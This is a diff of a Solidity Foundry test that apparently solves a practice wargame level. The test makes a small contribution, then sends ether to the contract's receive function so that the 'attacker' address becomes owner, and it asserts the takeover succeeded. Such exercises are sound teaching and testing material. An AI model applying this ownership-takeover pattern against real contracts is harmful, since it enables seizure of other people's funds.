@@ -24,7 +24,7 @@ contract FallbackTest is Test {
         // Change msg.sender to attacker for all following calls
         vm.startPrank(attacker);
 
-        level1.contribute{value: 1 gwei}();
+        level1.contribute{value: 1 wei}();
 
         uint contractBalanceBeforeAttack = address(level1).balance;
         emit log_named_uint(
@@ -34,9 +34,10 @@ contract FallbackTest is Test {
 
         // Send ether to contract without specifying msg.data
         // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
-        (bool success, ) = address(level1).call{value: 1 gwei}("");
+        (bool success, ) = address(level1).call{value: 1 wei}("");
         assertTrue(success, "Failed to trigger receive function");
 
+        // Check attacker is the new owner
         address newOwner = level1.owner();
         assertEq(attacker, newOwner);
         emit log_named_address("New Owner", newOwner);
